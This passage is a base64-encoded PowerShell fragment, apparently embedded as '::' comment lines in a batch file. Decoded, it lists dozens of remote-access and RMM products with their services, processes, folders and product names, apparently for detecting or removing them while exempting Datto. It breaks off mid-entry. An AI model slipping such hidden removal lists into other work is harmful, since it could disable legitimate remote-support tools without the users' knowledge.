::IFJNTSAvIHJlbW90ZS1hY2Nlc3MgdG9vbHMgKG1hcmtldCBjb3ZlcmFnZSAyMDI2
::KS4NCiAgICAjIEtFRVAgZm9yZXZlcjogRGF0dG8vQ2VudHJhU3RhZ2UgKyBTY3Jl
::ZW5Db25uZWN0IGtlZXAgRlBzIChoYW5kbGVkIGFib3ZlKS4NCiAgICAjIE5FVkVS
::IHB1dCBEYXR0by9DZW50cmFTdGFnZS9DYWdTZXJ2aWNlIGluIHRoaXMgbGlzdC4N
::CiAgICBmdW5jdGlvbiBJcy1EYXR0b0tlZXBlcihbc3RyaW5nXSRzKSB7DQogICAg
::ICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgICAgICByZXR1
::cm4gW2Jvb2xdKCRzIC1tYXRjaCAnKD9pKURhdHRvfENlbnRyYVN0YWdlfENhZ1Nl
::cnZpY2V8QXV0b3Rhc2tFbmRwb2ludCcpDQogICAgfQ0KICAgICRybW0gPSBAKA0K
::ICAgICAgICBAeyBUYWc9J0FueURlc2snOyAgICAgIFN2Yz1AKCdBbnlEZXNrJyk7
::IFByb2M9QCgnQW55RGVzaycpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFu
::eURlc2siLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQW55RGVzayIsIiRlbnY6
::UHJvZ3JhbURhdGFcQW55RGVzayIpOyBQcm9kPUAoJ0FueURlc2sqJykgfQ0KICAg
::ICAgICBAeyBUYWc9J1RlYW1WaWV3ZXInOyAgIFN2Yz1AKCdUZWFtVmlld2VyKicp
::OyBQcm9jPUAoJ1RlYW1WaWV3ZXIqJywndHZfdzMyKicsJ3R2X3g2NConKTsgRGly
::cz1AKCIkZW52OlByb2dyYW1GaWxlc1xUZWFtVmlld2VyIiwiJHtlbnY6UHJvZ3Jh
::bUZpbGVzKHg4Nil9XFRlYW1WaWV3ZXIiKTsgUHJvZD1AKCdUZWFtVmlld2VyKicp
::IH0NCiAgICAgICAgQHsgVGFnPSdTcGxhc2h0b3AnOyAgICBTdmM9QCgnU3BsYXNo
::dG9wKicsJ1NSU2VydmljZScsJ1NTVVNlcnZpY2UnKTsgUHJvYz1AKCdTcGxhc2h0
::b3AqJywnc3Ryd2luY2x0KicsJ1NSTWFuYWdlcionKTsgRGlycz1AKCIkZW52OlBy
::b2dyYW1GaWxlc1xTcGxhc2h0b3AiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
::U3BsYXNodG9wIik7IFByb2Q9QCgnU3BsYXNodG9wKicpIH0NCiAgICAgICAgQHsg
::VGFnPSdMb2dNZUluJzsgICAgICBTdmM9QCgnTG9nTWVJbicsJ0xNSUd1YXJkaWFu
::U3ZjJywnTE1JaWduaXRpb24nKTsgUHJvYz1AKCdMb2dNZUluKicsJ0xNSUd1YXJk
::aWFuKicsJ1JhU2VydmVyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXExv
::Z01lSW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTG9nTWVJbiIpOyBQcm9k
::PUAoJ0xvZ01lSW4qJykgfQ0KICAgICAgICBAeyBUYWc9J0dvVG8nOyAgICAgICAg
::IFN2Yz1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ0dvVG9SZXNvbHZlKicp
::OyBQcm9jPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnZzJtKicsJ0dvVG9S
::ZXNvbHZlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvVG9NeVBDIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdvVG9NeVBDIik7IFByb2Q9QCgnR29U
::b015UEMqJywnR29Ub0Fzc2lzdConLCdHb1RvIFJlc29sdmUqJywnR29Ub01lZXRp
::bmcqJywnR29UbyBDb25uZWN0KicpIH0NCiAgICAgICAgQHsgVGFnPSdSdXN0RGVz
::ayc7ICAgICBTdmM9QCgnUnVzdERlc2snLCdydXN0ZGVzayonKTsgUHJvYz1AKCdy
::dXN0ZGVzayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSdXN0RGVzayIs
::IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSdXN0RGVzayIpOyBQcm9kPUAoJ1J1
::c3REZXNrKicpIH0NCiAgICAgICAgQHsgVGFnPSdTdXByZW1vJzsgICAgICBTdmM9
::QCgnU3VwcmVtbyonKTsgUHJvYz1AKCdTdXByZW1vKicpOyBEaXJzPUAoIiRlbnY6
::UHJvZ3JhbUZpbGVzXFN1cHJlbW8iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
::U3VwcmVtbyIpOyBQcm9kPUAoJ1N1cHJlbW8qJykgfQ0KICAgICAgICBAeyBUYWc9
::J0RXU2VydmljZSc7ICAgIFN2Yz1AKCdEV0FnZW50JywnZHdhZ2VudConKTsgUHJv
::Yz1AKCdkd2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERXQWdl
::bnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRFdBZ2VudCIsIiRlbnY6UHJv
::Z3JhbURhdGFcRFdBZ2VudCIpOyBQcm9kPUAoJ0RXQWdlbnQqJywnRFdTZXJ2aWNl
::KicpIH0NCiAgICAgICAgQHsgVGFnPSdab2hvQXNzaXN0JzsgICBTdmM9QCgnWm9o
::b0Fzc2lzdConLCdab2hvTWVldGluZyonKTsgUHJvYz1AKCdab2hvQXNzaXN0Kics
::J1pvaG9VUlNCKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFpvaG9NZWV0
::aW5nIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFpvaG9NZWV0aW5nIik7IFBy
::b2Q9QCgnWm9obyBBc3Npc3QqJywnWm9ob01lZXRpbmcqJykgfQ0KICAgICAgICBA
::eyBUYWc9J1JlbW90ZVBDJzsgICAgIFN2Yz1AKCdSZW1vdGVQQyonKTsgUHJvYz1A
::KCdSZW1vdGVQQyonLCdSUENTdWl0ZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
::aWxlc1xSZW1vdGVQQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSZW1vdGVQ
::QyIpOyBQcm9kPUAoJ1JlbW90ZVBDKicpIH0NCiAgICAgICAgQHsgVGFnPSdCb21n
::YXInOyAgICAgICBTdmM9QCgnYm9tZ2FyKicsJ0JleW9uZFRydXN0KicpOyBQcm9j
::PUAoJ2JvbWdhcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xCb21nYXIi
::LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQm9tZ2FyIiwiJGVudjpQcm9ncmFt
::RmlsZXNcQmV5b25kVHJ1c3QiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQmV5
::b25kVHJ1c3QiKTsgUHJvZD1AKCdCb21nYXIqJywnQmV5b25kVHJ1c3QqJykgfQ0K
::ICAgICAgICBAeyBUYWc9J1BhcnNlYyc7ICAgICAgIFN2Yz1AKCdQYXJzZWMqJyk7
::IFByb2M9QCgncGFyc2VjZConLCdwc2VydmljZSonKTsgRGlycz1AKCIkZW52OlBy
::b2dyYW1GaWxlc1xQYXJzZWMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUGFy
::c2VjIiwiJGVudjpQcm9ncmFtRGF0YVxQYXJzZWMiKTsgUHJvZD1AKCdQYXJzZWMq
::JykgfQ0KICAgICAgICBAeyBUYWc9J0Nocm9tZVJEJzsgICAgIFN2Yz1AKCdjaHJv
::bW90aW5nKicpOyBQcm9jPUAoJ3JlbW90aW5nX2hvc3QqJyk7IERpcnM9QCgiJGVu
::djpQcm9ncmFtRmlsZXNcR29vZ2xlXENocm9tZSBSZW1vdGUgRGVza3RvcCIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb29nbGVcQ2hyb21lIFJlbW90ZSBEZXNr
::dG9wIik7IFByb2Q9QCgnQ2hyb21lIFJlbW90ZSBEZXNrdG9wKicpIH0NCiAgICAg
::ICAgQHsgVGFnPSdVbHRyYVZOQyc7ICAgICBTdmM9QCgndXZuYyonLCd3aW52bmMq
::Jyk7IFByb2M9QCgnd2ludm5jKicsJ3V2bmMqJyk7IERpcnM9QCgiJGVudjpQcm9n
::cmFtRmlsZXNcVWx0cmFWTkMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVWx0
::cmFWTkMiKTsgUHJvZD1AKCdVbHRyYVZOQyonLCdXaW5WTkMqJykgfQ0KICAgICAg
::ICBAeyBUYWc9J1RpZ2h0Vk5DJzsgICAgIFN2Yz1AKCd0dm5zZXJ2ZXIqJyk7IFBy
::b2M9QCgndHZuc2VydmVyKicsJ3R2bnZpZXdlcionKTsgRGlycz1AKCIkZW52OlBy
::b2dyYW1GaWxlc1xUaWdodFZOQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxU
::aWdodFZOQyIpOyBQcm9kPUAoJ1RpZ2h0Vk5DKicpIH0NCiAgICAgICAgQHsgVGFn
::PSdSZWFsVk5DJzsgICAgICBTdmM9QCgndm5jc2VydmVyKicpOyBQcm9jPUAoJ3Zu
::Y3NlcnZlcionLCd2bmN2aWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
::ZXNcUmVhbFZOQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSZWFsVk5DIik7
::IFByb2Q9QCgnVk5DIFNlcnZlcionLCdSZWFsVk5DKicpIH0NCiAgICAgICAgQHsg
::VGFnPSdEYW1lV2FyZSc7ICAgICBTdmM9QCgnRGFtZVdhcmUqJyk7IFByb2M9QCgn
::RFdSQ1MqJywnRFdSQ0MqJywnRGFtZVdhcmUqJyk7IERpcnM9QCgiJGVudjpQcm9n
::cmFtRmlsZXNcU29sYXJXaW5kcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxT
::b2xhcldpbmRzIiwiJGVudjpQcm9ncmFtRmlsZXNcRGFtZVdhcmUgUmVtb3RlIFN1
::cHBvcnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRGFtZVdhcmUgUmVtb3Rl
::IFN1cHBvcnQiKTsgUHJvZD1AKCdEYW1lV2FyZSonKSB9DQogICAgICAgIEB7IFRh
::Zz0nTmV0U3VwcG9ydCc7ICAgU3ZjPUAoJ05ldFN1cHBvcnQqJyk7IFByb2M9QCgn
::Y2xpZW50MzIqJywncGNpY3RsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
::XE5ldFN1cHBvcnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmV0U3VwcG9y
::dCIpOyBQcm9kPUAoJ05ldFN1cHBvcnQqJykgfQ0KICAgICAgICBAeyBUYWc9J1Np
::bXBsZUhlbHAnOyAgIFN2Yz1AKCdTaW1wbGVIZWxwKicpOyBQcm9jPUAoJ1NpbXBs
::ZVNlcnZpY2UqJywnc2ltcGxlc2VydmljZSonKTsgRGlycz1AKCIkZW52OlByb2dy
::YW1GaWxlc1xTaW1wbGVIZWxwIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNp
::bXBsZUhlbHAiKTsgUHJvZD1AKCdTaW1wbGVIZWxwKicpIH0NCiAgICAgICAgQHsg
::VGFnPSdHZXRTY3JlZW4nOyAgICBTdmM9QCgnR2V0U2NyZWVuKicpOyBQcm9jPUAo
::J0dldFNjcmVlbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHZXRTY3Jl
::ZW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR2V0U2NyZWVuIik7IFByb2Q9
::QCgnR2V0U2NyZWVuKicpIH0NCiAgICAgICAgQHsgVGFnPSdJcGVyaXVzJzsgICAg
::ICBTdmM9QCgnSXBlcml1cyonKTsgUHJvYz1AKCdJcGVyaXVzUmVtb3RlKicpOyBE
::aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXElwZXJpdXMgUmVtb3RlIiwiJHtlbnY6
::UHJvZ3JhbUZpbGVzKHg4Nil9XElwZXJpdXMgUmVtb3RlIik7IFByb2Q9QCgnSXBl
::cml1cyonKSB9DQogICAgICAgIEB7IFRhZz0nSVNMT25saW5lJzsgICBTdmM9QCgn
::SVNMbGlnaHQqJyk7IFByb2M9QCgnSVNMbGlnaHQqJywnSVNMQWx3YXlzT24qJyk7
::IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcSVNMIE9ubGluZSIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxJU0wgT25saW5lIik7IFByb2Q9QCgnSVNMIExpZ2h0
::KicsJ0lTTCBBbHdheXNPbionKSB9DQogICAgICAgIEB7IFRhZz0nQW1teXknOyAg
::ICAgICAgU3ZjPUAoJ0FtbXl5KicpOyBQcm9jPUAoJ0FtbXl5KicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXEFtbXl5IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
::Nil9XEFtbXl5Iik7IFByb2Q9QCgnQW1teXkqJykgfQ0KICAgICAgICBAeyBUYWc9
::J1VsdHJhVmlld2VyJzsgIFN2Yz1AKCdVbHRyYVZpZXdlcionKTsgUHJvYz1AKCdV
::bHRyYVZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZp
::ZXdlciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxVbHRyYVZpZXdlciIpOyBQ
::cm9kPUAoJ1VsdHJhVmlld2VyKicpIH0NCiAgICAgICAgQHsgVGFnPSdBZXJvQWRt
::aW4nOyAgICBTdmM9QCgnQWVyb0FkbWluKicpOyBQcm9jPUAoJ0Flcm9BZG1pbion
::KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZXJvQWRtaW4iLCIke2VudjpQ
::cm9ncmFtRmlsZXMoeDg2KX1cQWVyb0FkbWluIik7IFByb2Q9QCgnQWVyb0FkbWlu
::KicpIH0NCiAgICAgICAgQHsgVGFnPSdMaXRlTWFuYWdlcic7ICBTdmM9QCgnTGl0
::ZU1hbmFnZXIqJyk7IFByb2M9QCgnUk9NU2VydmVyKicsJ1JPTVZpZXdlcionKTsg
::RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xMaXRlTWFuYWdlciIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxMaXRlTWFuYWdlciIpOyBQcm9kPUAoJ0xpdGVNYW5h
::Z2VyKicpIH0NCiAgICAgICAgQHsgVGFnPSdSYWRtaW4nOyAgICAgICBTdmM9QCgn
::UmFkbWluKicpOyBQcm9jPUAoJ3JzZXJ2ZXIzKicsJ1JhZG1pbionKTsgRGlycz1A
::KCIkZW52OlByb2dyYW1GaWxlc1xSYWRtaW4gU2VydmVyIDMiLCIke2VudjpQcm9n
::cmFtRmlsZXMoeDg2KX1cUmFkbWluIFNlcnZlciAzIik7IFByb2Q9QCgnUmFkbWlu
::KicpIH0NCiAgICAgICAgQHsgVGFnPSdOb01hY2hpbmUnOyAgICBTdmM9QCgnbnhz
::ZXJ2ZXIqJywnbnhkKicpOyBQcm9jPUAoJ254ZConLCdueHNlcnZlcionLCdueHJ1
::bm5lcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xOb01hY2hpbmUiLCIk
::e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTm9NYWNoaW5lIik7IFByb2Q9QCgnTm9N
::YWNoaW5lKicpIH0NCiAgICAgICAgQHsgVGFnPSdOaW5qYU9uZSc7ICAgICBTdmM9
::QCgnTmluamFSTU1BZ2VudCcsJ25pbmphcm1tKicsJ05pbmphUk1NKicpOyBQcm9j
::PUAoJ05pbmphUk1NQWdlbnQqJywnbmluamFybW0qJyk7IERpcnM9QCgiJGVudjpQ
::cm9ncmFtRmlsZXNcTmluamFSTU1BZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
::ODYpfVxOaW5qYVJNTUFnZW50IiwiJGVudjpQcm9ncmFtRGF0YVxOaW5qYVJNTUFn
::ZW50IiwiJGVudjpQcm9ncmFtRmlsZXNcTmluamFPbmUiLCIke2VudjpQcm9ncmFt
::RmlsZXMoeDg2KX1cTmluamFPbmUiKTsgUHJvZD1AKCdOaW5qYVJNTSonLCdOaW5q
::YU9uZSonKSB9DQogICAgICAgIEB7IFRhZz0nQXRlcmEnOyAgICAgICAgU3ZjPUAo
::J0F0ZXJhQWdlbnQnKTsgUHJvYz1AKCdBdGVyYUFnZW50KicpOyBEaXJzPUAoIiRl
::bnY6UHJvZ3JhbUZpbGVzXEFURVJBIE5ldHdvcmtzIiwiJHtlbnY6UHJvZ3JhbUZp
::bGVzKHg4Nil9XEFURVJBIE5ldHdvcmtzIiwiJGVudjpQcm9ncmFtRGF0YVxBVEVS
::QSBOZXR3b3JrcyIpOyBQcm9kPUAoJ0F0ZXJhKicpIH0NCiAgICAgICAgQHsgVGFn
::PSdDb25uZWN0V2lzZSc7ICBTdmM9QCgnTFRTZXJ2aWNlJywnTFRTdmNNb24nKTsg
::UHJvYz1AKCdMVFN2YyonLCdMVFRyYXkqJyk7IERpcnM9QCgiJGVudjp3aW5kaXJc
::TFRTdmMiLCIkZW52OlByb2dyYW1GaWxlc1xMYWJUZWNoIENsaWVudCIsIiR7ZW52
::OlByb2dyYW1GaWxlcyh4ODYpfVxMYWJUZWNoIENsaWVudCIpOyBQcm9kPUAoJ0Nv
::bm5lY3RXaXNlIEF1dG9tYXRlKicsJ0Nvbm5lY3RXaXNlIFJNTSonLCdMYWJUZWNo
::KicpIH0NCiAgICAgICAgQHsgVGFnPSdLYXNleWEnOyAgICAgICBTdmM9QCgnQWdl
::bnRNb24nLCdLYXNleWEqJywnS0FBRFMqJyk7IFByb2M9QCgnQWdlbnRNb24qJywn
::S2FzZXlhKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEthc2V5YSIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxLYXNleWEiKTsgUHJvZD1AKCdLYXNleWEg
::VlNBKicsJ0thc2V5YSBBZ2VudConKSB9DQogICAgICAgIEB7IFRhZz0nTmFibGUn
::OyAgICAgICAgU3ZjPUAoJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQqJywnTi1h
::YmxlKicsJ05DZW50cmFsKicpOyBQcm9jPUAoJ0ZpbGVTeXN0ZW1BZ2VudConLCdO
::Q2VudHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZHZhbmNlZCBN
::b25pdG9yaW5nIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFkdmFu
::Y2VkIE1vbml0b3JpbmcgQWdlbnQiLCIkZW52OlByb2dyYW1GaWxlc1xOLWFibGUg
::VGVjaG5vbG9naWVzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE4tYWJsZSBU
::ZWNobm9sb2dpZXMiLCIkZW52OlByb2dyYW1GaWxlc1xNU1BBIEZpbGVzIiwiJHtl
::bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1TUEEgRmlsZXMiKTsgUHJvZD1AKCdBZHZh
::bmNlZCBNb25pdG9yaW5nIEFnZW50KicsJ04tYWJsZSonLCdOLWNlbnRyYWwqJywn
::Ti1zaWdodConLCdUYWtlIENvbnRyb2wqJywnU29sYXJXaW5kcyBNU1AqJykgfQ0K
::ICAgICAgICBAeyBUYWc9J1N5bmNybyc7ICAgICAgIFN2Yz1AKCdTeW5jcm8qJywn
::S2FidXRvKicpOyBQcm9jPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IERpcnM9QCgi
::JGVudjpQcm9ncmFtRmlsZXNcUmVwYWlyVGVjaCIsIiR7ZW52OlByb2dyYW1GaWxl
::cyh4ODYpfVxSZXBhaXJUZWNoIiwiJGVudjpQcm9ncmFtRmlsZXNcU3luY3JvIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN5bmNybyIsIiRlbnY6UHJvZ3JhbURh
::dGFcU3luY3JvIik7IFByb2Q9QCgnU3luY3JvKicsJ0thYnV0byonLCdSZXBhaXJU
::ZWNoKicpIH0NCiAgICAgICAgQHsgVGFnPSdQdWxzZXdheSc7ICAgICBTdmM9QCgn
::UHVsc2V3YXkqJywnUEMgTW9uaXRvcionKTsgUHJvYz1AKCdQQ01vbml0b3JNZ3Iq
::JywnUENNb25pdG9yTWFuYWdlcionLCdQdWxzZXdheSonKTsgRGlycz1AKCIkZW52
::OlByb2dyYW1GaWxlc1xQdWxzZXdheSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
::fVxQdWxzZXdheSIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBDIE1vbml0b3IiLCIke2Vu
::djpQcm9ncmFtRmlsZXMoeDg2KX1cUEMgTW9uaXRvciIpOyBQcm9kPUAoJ1B1bHNl
::d2F5KicsJ1BDIE1vbml0b3IqJykgfQ0KICAgICAgICBAeyBUYWc9J1N1cGVyT3Bz
::JzsgICAgIFN2Yz1AKCdTdXBlck9wcyonKTsgUHJvYz1AKCdTdXBlck9wcyonKTsg
::RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTdXBlck9wcyIsIiR7ZW52OlByb2dy
::YW1GaWxlcyh4ODYpfVxTdXBlck9wcyIsIiRlbnY6UHJvZ3JhbURhdGFcU3VwZXJP
::cHMiKTsgUHJvZD1AKCdTdXBlck9wcyonKSB9DQogICAgICAgIEB7IFRhZz0nTGV2
::ZWwnOyAgICAgICAgU3ZjPUAoJ0xldmVsKicpOyBQcm9jPUAoJ2xldmVsKicpOyBE
::aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXExldmVsIiwiJHtlbnY6UHJvZ3JhbUZp
::bGVzKHg4Nil9XExldmVsIiwiJGVudjpQcm9ncmFtRGF0YVxMZXZlbCIpOyBQcm9k
::PUAoJ0xldmVsKicpIH0NCiAgICAgICAgQHsgVGFnPSdBY3Rpb24xJzsgICAgICBT
::dmM9QCgnQWN0aW9uMSonKTsgUHJvYz1AKCdBY3Rpb24xKicsJ2FjdGlvbjFfYWdl
::bnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWN0aW9uMSIsIiR7ZW52
::OlByb2dyYW1GaWxlcyh4ODYpfVxBY3Rpb24xIiwiJGVudjpQcm9ncmFtRGF0YVxB
::Y3Rpb24xIik7IFByb2Q9QCgnQWN0aW9uMSonKSB9DQogICAgICAgIEB7IFRhZz0n
::TWFuYWdlRW5naW5lJzsgU3ZjPUAoJ01hbmFnZUVuZ2luZSonLCdVRU1TKicsJ0RD
::QWdlbnQqJyk7IFByb2M9QCgnTWFuYWdlRW5naW5lKicsJ2RjYWdlbnQqJywnVUVN
::UyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xNYW5hZ2VFbmdpbmUiLCIk
::e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWFuYWdlRW5naW5lIik7IFByb2Q9QCgn
::TWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRGVza3RvcCBDZW50cmFsKicsJ0VuZHBv
::aW50IENlbnRyYWwqJywnUk1NIENlbnRyYWwqJykgfQ0KICAgICAgICBAeyBUYWc9
::J1RhY3RpY2FsUk1NJzsgIFN2Yz1AKCd0YWN0aWNhbHJtbSonLCdNZXNoIEFnZW50
::JywnTWVzaEFnZW50Jyk7IFByb2M9QCgndGFjdGljYWxybW0qJywnbWVzaGFnZW50
::KicsJ01lc2hBZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUYWN0
::aWNhbEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRhY3RpY2FsQWdl
::bnQiLCIkZW52OlByb2dyYW1GaWxlc1xNZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3Jh
::bUZpbGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdUYWN0aWNhbConLCdN
::ZXNoIEFnZW50KicsJ01lc2hDZW50cmFsKicpIH0NCiAgICAgICAgQHsgVGFnPSdN
::ZXNoQ2VudHJhbCc7ICBTdmM9QCgnTWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcsJ01l
::c2hDZW50cmFsKicpOyBQcm9jPUAoJ01lc2hBZ2VudConLCdNZXNoQ2VudHJhbCon
::KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xNZXNoIEFnZW50IiwiJHtlbnY6
::UHJvZ3JhbUZpbGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdNZXNoKkFn
::ZW50KicsJ01lc2hDZW50cmFsKicpIH0NCiAgICAgICAgQHsgVGFnPSdDb250aW51
::dW0nOyAgICBTdmM9QCgnU0FBWionLCdDb250aW51dW0qJyk7IFByb2M9QCgnU0FB
::WionLCdDb250aW51dW0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU0FB
::Wk9EIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNBQVpPRCIsIiRlbnY6UHJv
::Z3JhbUZpbGVzXENvbnRpbnV1bSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxD
::b250aW51dW0iKTsgUHJvZD1AKCdDb250aW51dW0qJywnU0FBWionKSB9DQogICAg
::ICAgIEB7IFRhZz0nTmF2ZXJpc2snOyAgICAgU3ZjPUAoJ05hdmVyaXNrKicpOyBQ
::cm9jPUAoJ05hdmVyaXNrKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5h
::dmVyaXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5hdmVyaXNrIik7IFBy
::b2Q9QCgnTmF2ZXJpc2sqJykgfQ0KICAgICAgICBAeyBUYWc9J0ltbXlCb3QnOyAg
::ICAgIFN2Yz1AKCdJbW15Qm90KicsJ0ltbXkqJyk7IFByb2M9QCgnSW1teUFnZW50
::KicsJ0ltbXlCb3QqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcSW1teUJv
::dCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxJbW15Qm90IiwiJGVudjpQcm9n
::cmFtRGF0YVxJbW15Qm90Iik7IFByb2Q9QCgnSW1teUJvdConKSB9DQogICAgICAg
::IEB7IFRhZz0nQXV0b21veCc7ICAgICAgU3ZjPUAoJ2FtYWdlbnQqJywnQXV0b21v
::eConKTsgUHJvYz1AKCdhbWFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
::bGVzXEF1dG9tb3giLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQXV0b21veCIs
::IiRlbnY6UHJvZ3JhbURhdGFcYW1hZ2VudCIpOyBQcm9kPUAoJ0F1dG9tb3gqJykg
::fQ0KICAgICAgICBAeyBUYWc9J0Fjcm9uaXNDeWJlcic7IFN2Yz1AKCdBY3Jvbmlz
::KicpOyBQcm9jPUAoJ2Fjcm9jbWQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
::ZXNcQWNyb25pcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBY3JvbmlzIik7
::IFByb2Q9QCgnQWNyb25pcyBDeWJlcionLCdBY3JvbmlzIEFnZW50KicsJ0N5YmVy
::IFByb3RlY3QgQWdlbnQqJykgfQ0KICAgICAgICBAeyBUYWc9J0RvbW90eic7ICAg
::ICAgIFN2Yz1AKCdEb21vdHoqJyk7IFByb2M9QCgnRG9tb3R6KicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXERvbW90eiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
::ODYpfVxEb21vdHoiKTsgUHJvZD1AKCdEb21vdHoqJykgfQ0KICAgICAgICBAeyBU
::YWc9J0F1dmlrJzsgICAgICAgIFN2Yz1AKCdBdXZpayonKTsgUHJvYz1AKCdBdXZp
::ayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBdXZpayIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxBdXZpayIpOyBQcm9kPUAoJ0F1dmlrKicpIH0NCiAg
::ICAgICAgQHsgVGFnPSdCYXJyYWN1ZGFSTU0nOyBTdmM9QCgnQmFycmFjdWRhKicp
::OyBQcm9jPUAoJ01XU2VydmljZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
::c1xCYXJyYWN1ZGEiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQmFycmFjdWRh
::IiwiJGVudjpQcm9ncmFtRmlsZXNcTGV2ZWwgUGxhdGZvcm1zIiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XExldmVsIFBsYXRmb3JtcyIpOyBQcm9kPUAoJ0JhcnJh
::Y3VkYSBSTU0qJywnTWFuYWdlZCBXb3JrcGxhY2UqJykgfQ0KICAgICAgICBAeyBU
::YWc9J0dvdmVybGFuJzsgICAgIFN2Yz1AKCdHb3ZlcmxhbionKTsgUHJvYz1AKCdn
::b3ZlcmxhbionLCdnb3ZhZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
